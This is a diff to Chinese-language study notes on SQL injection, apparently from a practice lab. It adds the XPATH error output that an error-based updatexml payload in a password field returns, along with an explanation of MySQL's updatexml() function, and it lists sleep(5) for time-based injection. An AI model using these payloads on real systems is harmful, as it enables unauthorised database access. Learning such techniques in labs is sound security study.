@@ -371,6 +371,8 @@ sql源码
 
 `password:` ` 1' and updatexml(1,concat(0x7e,(select database())),1) and '1' = '1 `
 
+回显`XPATH syntax error: '~security'`
+
 2. 
 
 
@@ -462,3 +464,13 @@ sql源码
 19. `sleep(5)`
 
 含义: 暂停5秒
+
+^ 20. `updatexml(XML_target, XPath_expr, new_XML)`
+
+是 MySQL 的 XML 处理函数，5.1.5 引入，和 extractvalue() 是一对(有兴趣自己查extractvalue()，这里不做展开)
+
+含义: `UPDATEXML(XML_target, XPath_expr, new_XML)`在一段 XML 里用 XPath 定位节点，把匹配到的节点替换成 new_XML，返回修改后的 XML
+
+
+
+
